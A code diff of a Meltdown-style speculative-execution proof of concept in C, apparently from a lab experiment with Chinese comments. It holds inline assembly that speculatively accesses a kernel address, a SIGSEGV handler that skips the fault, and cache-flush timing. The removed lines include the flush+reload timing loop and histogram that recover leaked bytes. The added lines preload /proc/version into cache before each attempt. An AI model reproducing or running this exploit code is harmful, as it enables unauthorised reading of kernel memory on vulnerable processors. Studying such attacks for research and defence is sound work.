@@ -11,14 +11,16 @@
 #include "../utils/cache_instr.h"
 #include <x86intrin.h>
 
-#define TARGET_OFFSET	12
-#define TARGET_SIZE	(1 << TARGET_OFFSET)   //4096
-#define BITS_READ	8
-#define VARIANTS_READ	(1 << BITS_READ)   //256
+#define TARGET_OFFSET 12
+#define TARGET_SIZE (1 << TARGET_OFFSET) // 4096
+#define BITS_READ 8
+#define VARIANTS_READ (1 << BITS_READ) // 256
 
 int cache_hit_threshold = 400;
 
-int flag =1;    //显示错误原因
+int flag = 1; // 显示错误原因
+
+int init_kernel_in_cache = 1; // 初始化内核加载进cache
 
 static char target_array[VARIANTS_READ * TARGET_SIZE];
 
@@ -35,7 +37,7 @@ extern char stopspeculate[];
 static void __attribute__((noinline))
 speculate(unsigned long addr)
 {
-	__asm__ volatile (
+	__asm__ volatile(
 		"1:\n\t"
 
 		".rept 300\n\t"
@@ -50,51 +52,28 @@ speculate(unsigned long addr)
 		"stopspeculate: \n\t"
 		"nop\n\t"
 		:
-		: [target] "r" (target_array),
-		  [addr] "r" (addr)
-		: "rax", "rbx"
-	);
+		: [target] "r"(target_array),
+		  [addr] "r"(addr)
+		: "rax", "rbx");
 }
-
-
-static int hist[VARIANTS_READ];
-void check(void)
-{
-	int i, time, mix_i;
-	register uint64_t time1, time2;
-	volatile char *addr;
-
-	for (i = 0; i < VARIANTS_READ; i++) {
-		mix_i = ((i * 167) + 13) & 255;
-
-		addr = &target_array[mix_i * TARGET_SIZE];
-		time1 = rdtscp();
-        maccess(addr);
-        time2 = rdtscp();
-
-		if ((int)(time2 - time1) <= cache_hit_threshold)
-			hist[mix_i]++;
-	}
-}
-
 
 
 void sigsegv(int sig, siginfo_t *siginfo, void *context)
 {
 	ucontext_t *ucontext = context;
-	if (flag){
+	if (flag)
+	{
 		unsigned long err = ucontext->uc_mcontext.gregs[REG_ERR];
-		const char *scode = (siginfo->si_code == SEGV_MAPERR) ? "MAPERR"
-						: (siginfo->si_code == SEGV_ACCERR) ? "ACCERR"
-														: "OTHER";
+		const char *scode = (siginfo->si_code == SEGV_MAPERR)	? "MAPERR"
+							: (siginfo->si_code == SEGV_ACCERR) ? "ACCERR"
+																: "OTHER";
 		fprintf(stderr,
-			"[SEGV] addr=%p siginfo_code=%d(%s) PF_ERR=0x%lx  [P=%lu W/R=%lu U/S=%lu]\n",
-			siginfo->si_addr, siginfo->si_code, scode, err,
-			(err & 1UL), ((err >> 1) & 1UL), ((err >> 2) & 1UL));
+				"[SEGV] addr=%p siginfo_code=%d(%s) PF_ERR=0x%lx  [P=%lu W/R=%lu U/S=%lu]\n",
+				siginfo->si_addr, siginfo->si_code, scode, err,
+				(err & 1UL), ((err >> 1) & 1UL), ((err >> 2) & 1UL));
 		fflush(stderr);
-		break;
+		exit(1);
 	}
-
 
 	ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t)&stopspeculate;
 	return;
@@ -107,42 +86,46 @@ int set_signal()
 		.sa_flags = SA_SIGINFO,
 	};
 
-
 	return sigaction(SIGSEGV, &act, NULL);
 }
 
 #define CYCLES 1000
-int ReadOneByte(unsigned long addr)
+int ReadOneByte(int fd, unsigned long addr)
 {
 	int i, ret = 0, max = -1, maxi = -1;
 	static char buf[256];
 
-	memset(hist, 0, sizeof(hist));
 
-	for (i = 0; i < CYCLES; i++) {
+	for (i = 0; i < CYCLES; i++)
+	{
 
+		if (init_kernel_in_cache)
+		{
+			// 将目标文件加入到缓存，充分利用瞬态窗口
+			printf("Pre-loading......\n");
+			for (int j = 0; j < 64; j++)
+			{
+				ret = pread(fd, buf, sizeof(buf), 0);
+				if (ret < 0)
+				{
+					perror("pread");
+					break;
+				}
+			}
+		}
+		else
+		{
+			printf("No Pre-loading......\n");
+		}
+		
 		clflush_target();
 
 		mfence();
 
 		speculate(addr);
-
-		check();
 	}
-
-
-	for (i = 1; i < VARIANTS_READ; i++) {
-		if (!isprint(i))
-			continue;
-		if (hist[i] && hist[i] > max) {
-			max = hist[i];
-			maxi = i;
-		}
-	}
-
-	return maxi;
+	return 0;
 }
-
 
 static void pin_cpu0()
 {
@@ -156,44 +139,31 @@ static void pin_cpu0()
 
 int main(int argc, char *argv[])
 {
-	int ret, i, score, is_vulnerable;
+	int ret, i, fd;
 	unsigned long addr, size;
 
-    if (argc == 3 || argc == 4)
-    {
-        sscanf(argv[1], "%lx", &addr);
-        sscanf(argv[2], "%lx", &size);
+	fd = open("/proc/version", O_RDONLY);
+	if (fd < 0)
+	{
+		perror("open");
+		return -1;
+	}
 
-        if (argc == 4)
-        {
-            sscanf(argv[3], "%d", &cache_hit_threshold);
-        }
-    }
-    else
-    {
-        fprintf(stderr, "Usage: %s <hex_addr> <length> [cache_hit_threshold]\n", argv[0]);
-        return 1;
-    }
-
-	
+	if (argc == 3 || argc == 4)
+	{
+		sscanf(argv[1], "%lx", &addr);
+		sscanf(argv[2], "%d", &init_kernel_in_cache);
+	}
+	else
+	{
+		fprintf(stderr, "Usage: %s <hex_addr> <init_kernel_in_cache> \n", argv[0]);
+		return 1;
+	}
 
 	memset(target_array, 1, sizeof(target_array));
 
 	ret = set_signal();
 	pin_cpu0();
 
-
-    for (i = 0; i < size; i++)
-    {
-        ret = ReadOneByte(addr);
-        if (ret == -1)
-            ret = 0xff;
-        printf("read %lx = %x %c (score=%d/%d)\n",
-               addr, ret, isprint(ret) ? ret : ' ',
-               ret != 0xff ? hist[ret] : 0,
-               1000);
-        addr++;
-    }
-
-
+	ret = ReadOneByte(fd, addr);
 }
